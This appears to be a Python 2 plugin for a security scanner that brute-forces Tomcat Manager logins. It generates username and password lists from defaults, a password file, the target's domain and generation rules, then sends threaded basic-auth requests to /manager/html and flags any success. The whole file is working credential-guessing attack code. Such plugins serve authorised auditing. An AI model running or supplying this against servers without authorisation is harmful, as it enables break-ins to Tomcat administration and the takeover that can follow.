#!/usr/bin/python2.7
#coding:utf-8

import time
import sys
import re
import requests
import futures
from dummy import *

info = {
	'NAME':'Tomcat Weak Password',
	'AUTHOR':'tank,yangbh',
	'TIME':'20141102',
	'WEB':'http://zone.wooyun.org/content/15989',
	'DeSCRIPTION':'Tomcat 暴力破解'
}
# ----------------------------------------------------------------------------------------------------
#
# ----------------------------------------------------------------------------------------------------
def getPwds(neighborhosts):
	''' '''
	pwddicts={}
	#usernames = ['root','test','rootroot','admin','administrator']
	usernames=['manager','tomcat','admin','root','test','both','role1']

	commonpwd = []
	# pwdfile = BASEDIR+'/lib/db/password_small.dict'
	pwdfile = BASEDIR+'/lib/db/tomcat_pwd.dict'

	fp = open(pwdfile,'r')
	for eachline in fp:
		tp =  eachline.replace('\r','')
		tp =  tp.replace('\n','')
		if tp != '':
			commonpwd.append(tp)
	
	#
	# print neighborhosts
	if neighborhosts:
		for eachhost in neighborhosts:
			eachdomain = GetFirstLevelDomain(eachhost)
			tplist = eachdomain.split('.')
			usernames.append(tplist[0])
			usernames.append(eachhost)
			usernames.append(eachdomain)
			commonpwd.append(eachhost)
			commonpwd.append(eachdomain)
			commonpwd.append(tplist[0])

	#
	rulefile = BASEDIR +'/lib/db/passwd_gen.rule'
	for eachuser in usernames:
		pwddicts[eachuser] = list(commonpwd)
		args = {'username':eachuser}
		rf = RuleFile(rulefile,args)
		rf._getRules()
		for i in rf.ret:
			pwddicts[eachuser].append(i)

		pwddicts[eachuser] = sorted(list(set(pwddicts[eachuser])))

	return pwddicts

def tomcatcrack(url,username,passwd):
	tomurl = url + '/manager/html'
	for i in range(5):
		try:
			a = requests.get(tomurl,auth=(username,passwd))
			
			if a.status_code == 200:
				print username+':'+passwd,'success'
				security_hole(username+':'+passwd)
				return 'success'
			else:
				# print username+':'+passwd,'fail'
				return 'fail'
		# exceptions cased by multi threads
		except IndexError,e:
			# print 'IndexError',e
			pass

def Audit(services):
	if services.has_key('url') and services.has_key('webserver') and services['webserver'] == 'Tomcat':
		url = services['url']
		host = None
		m = re.match('(http[s]?)://([^:^/]+):?([^/]*)/',url)
		if m:
			host = m.group(2)
		pwddicts = getPwds(host)
		# pprint(pwddicts)

		fs = {}
		time.clock()
		# use ProcessPoolExecutor will faster
		with futures.ThreadPoolExecutor(max_workers=20) as executor:      #默认10线程
			time.clock()
			for eachname in pwddicts.keys():
				for eachpwd in pwddicts[eachname]:
					# print 'starting\t',eachname+':'+eachpwd
					future = executor.submit(tomcatcrack,url,eachname,eachpwd,)
					fs[future] = eachname+':'+eachpwd
					# print eachname+':'+eachpwd +' '+str(f.result())
			print time.clock()

			# 如何抓取到一个就优雅的退出？
			# print len(fs)
			# uncompleted_fs = fs
			# for future in futures.as_completed(fs):
			# 	url = fs[future]
			# 	if future.exception() is not None:
			# 		print('%r generated an exception: %s' % (url,future.exception()))
			# 		#Regardless of the value of wait, the entire Python program will not exit until all pending futures are done executing.
			# 		# executor.shutdown(wait=False)
			# 		break
			# 	else:
			# 		# print url,'\t',future.result()
			# 		uncompleted_fs.pop(future)
			# print len(fs)
			# print time.clock()
			# for future in uncompleted_fs:
			# 	url = uncompleted_fs[future]
			# 	fg = future.cancel()
			# 	# print 'canceling',url,'\t',fg
			# donefs,notdonefs = futures.wait(fs)
			# # print notdonefs
			# print time.clock()
		# 找到一个不立即停止，把所有子进程都跑完，最后返回，所花时间更长
		print time.clock()
# ----------------------------------------------------------------------------------------------------
#
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__': 
	services={'url':'http://localhost:8180','webserver':'Tomcat','webserverversion':'5.5'}
	pprint(Audit(services))
	pprint(services)
